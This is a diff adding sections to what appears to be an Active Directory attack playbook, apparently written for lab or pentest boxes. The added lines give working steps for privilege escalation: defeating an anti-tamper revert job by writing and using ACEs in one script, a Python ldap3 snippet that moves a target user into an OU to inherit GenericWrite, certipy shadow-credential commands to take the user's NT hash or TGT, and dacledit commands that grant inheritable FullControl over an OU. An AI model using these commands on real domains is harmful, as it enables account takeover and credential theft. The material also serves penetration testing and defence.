@@ -205,6 +205,36 @@ Implications:
     leaks — pivot through the cred, not the ACL.
 - DETECT adminCount=1: `Get-ADUser -Filter {adminCount -eq 1} -Properties adminCount`. If
   your ACL target has adminCount=1, plan to use the ACE within 60 minutes of writing it.
+- Some boxes run an ACTIVE anti-tamper job (separate from SDProp, every few minutes) that
+  reverts ACE/UAC/membership edits far faster than 60 min. Counter: do write+use back-to-back
+  in ONE script. Already-issued Kerberos TGTs and captured NT hashes SURVIVE the revert — once
+  you extract a ticket/hash in the one-shot window, the reversion no longer matters.
+```
+
+## OU-scoped inherited control — move a target in, or add an inheritable ACE
+
+```bash
+# CASE A — a group you control has an INHERITED GenericWrite/GenericAll over an OU's child
+# objects, but the user you want isn't in that OU. MOVE the target into the OU so it inherits
+# that control, then shadow-cred / reset it. The move (LDAP modifyDN) needs, on ONE principal:
+# WriteProperty on the target's RDN (name/cn) + CREATE_CHILD on the destination OU +
+# DELETE/DELETE_CHILD on the source. ldap3 modify_dn over Kerberos works on NTLM-disabled DCs:
+python3 - <<'PY'    # KRB5CCNAME = the mover's TGT
+from ldap3 import Server, Connection, SASL, KERBEROS
+c = Connection(Server('<DC_FQDN>', port=389), authentication=SASL, sasl_mechanism=KERBEROS); c.bind()
+print(c.modify_dn('CN=<target>,<SOURCE_OU>', 'CN=<target>', new_superior='<DEST_OU>'), c.result)
+PY
+# Then, as the inheriting group's member: certipy shadow auto -account <target>  (→ NT hash/TGT).
+# Cleanup: a second modify_dn moves the target back.
+
+# CASE B — you have GenericAll/Owner on an OU and want control over its NON-protected children.
+# Add an INHERITABLE ACE. On a Kerberos-only (NTLM-disabled) domain dacledit needs -dc-host
+# (else it falls back to SMB and dies with "NETBIOS connection timed out"):
+KRB5CCNAME=you.ccache dacledit.py -action write -rights FullControl -inheritance \
+  -principal <you> -target-dn '<OU_DN>' -k -no-pass -dc-ip <DC_IP> -dc-host <DC_FQDN> '<DOMAIN>/<you>'
+# adminCount=1 / DACL_PROTECTED children are NOT reachable this way (they don't inherit) —
+# bloodyAD `add genericAll <OU>` adds a NON-inheritable ACE on the OU object only; use dacledit
+# -inheritance for the children.
 ```
 
 ## Verifying success
